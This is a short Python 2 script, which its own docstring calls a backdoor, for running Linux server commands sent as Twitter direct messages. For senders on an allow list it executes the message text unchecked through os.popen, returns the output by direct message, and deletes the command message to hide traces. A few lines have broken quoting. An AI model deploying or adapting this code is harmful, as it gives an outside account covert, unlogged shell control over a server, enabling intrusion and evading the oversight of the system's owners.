
#!/usr/bin/env python


#Read a Direct Message(Twitter) from a predefined user/users and execute(Recipient) it

__author__ = ["Mad_Dev"]
__email__  = ["mad_dev@linuxmail.org"]

import os
import sys
import twitter
import subprocess

'''
	Requires python-twitter

	Backdoor was written to test the possibility of issuing 
	server(linux) commands from twitter.

	You can send a direct message to restart a service, or
	reboot the server.
 	
 	It could be used with cron.

 	It could be used as search bot.

 	This is an example.... 
'''

access_secret= ""
access_key= ""
consumer_secret= ""
consumer_key= ""

api=twitter.Api(consumer_key=consumer_key,
	consumer_secret=consumer_secret,
	access_token_key=access_key,
	access_token_secret=access_secret)


allow_list = [""] #allowed users.
m = api.GetDirectMessages()



def directMessage():
	
	if not [u.text for u in m]:
		print 'No Messages to Parse | [\033[91mEMPTY\033[0m]'
		sys.exit(''Exiting'')
	elif [u.text for u in m]:
		print 'Message [\033[93m%s\033[0m]' %u.text
		msg = u.text
		msg_id = u.id
		msg_sender_name = u.sender_screen_name
		return msg_id, msg, msg_sender_name



def checkUser(user, msg):

	for name in user:
		print 'Checking [\033[93m%s\033[0m]...' %msg[2]
		if msg[2] in allow_list:
			print '[\033[93m%s\033[0m] is Valid' %name
			print '[\033[93m%s\033[0m]' %msg[1] #Should add command test.
			cmd = os.popen(msg[1]).readlines() #command Exce
			for n in cmd:
				pass
			return msg[2], str(n), msg[0]
			
		elif msg[2] not in allow_list:
			print msg[2] + ' is not in Allow List'
			sys.exit(''Exiting'')

def sendReply(re):
	name = str(re[0])
	msg = str(re[1])
	api.PostDirectMessage(text=msg, screen_name=name)
	api.DestroyDirectMessage(id=re[2]) #Delete command (let's keep it clean)

if __name__ == ''__main__'':

	def run():
		msg =  directMessage()
		user = checkUser(allow_list, msg)
		sendReply(user)
	run()



'
